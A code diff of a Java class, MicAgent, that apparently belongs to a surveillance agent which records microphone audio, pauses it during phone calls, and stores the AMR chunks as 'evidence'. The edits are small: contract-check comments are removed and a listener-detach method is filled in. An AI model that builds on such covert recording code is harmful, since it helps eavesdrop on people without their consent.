@@ -126,9 +126,8 @@ public class MicAgent extends AgentBase implements Observer<Call> {
 			if (state == StateRun.STARTED) {
 				removePhoneListener();
 
-				// #ifdef DBC
 				Check.ensures(state != StateRun.STOPPED, "state == STOPPED");
-				// #endif
+
 				saveRecorderEvidence();
 				stopRecorder();
 				recorder.release();
@@ -181,14 +180,13 @@ public class MicAgent extends AgentBase implements Observer<Call> {
 	}
 
 	private void removePhoneListener() {
-		// TODO Auto-generated method stub
-	
+		ListenerCall.self().detach(this);
 	}
 
 	private void saveRecorderEvidence() {
-		// #ifdef DBC
+
 		Check.requires(recorder != null, "saveRecorderEvidence recorder==null");
-		// #endif
+
 
 		final byte[] chunk = getAvailable();
 
@@ -198,6 +196,7 @@ public class MicAgent extends AgentBase implements Observer<Call> {
 			if (Utils.equals(chunk, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
 				offset = AMR_HEADER.length;
 			}
+			
 			byte[] data;
 			if (offset == 0) {
 				data = chunk;
@@ -353,9 +352,8 @@ public class MicAgent extends AgentBase implements Observer<Call> {
 		databuffer.writeInt(sampleRate | LOG_AUDIO_CODEC_AMR);
 		databuffer.writeLong(fId);
 
-		// #ifdef DBC
 		Check.ensures(additionalData.length == tlen, "Wrong additional data name");
-		// #endif
+
 		return additionalData;
 	}
 
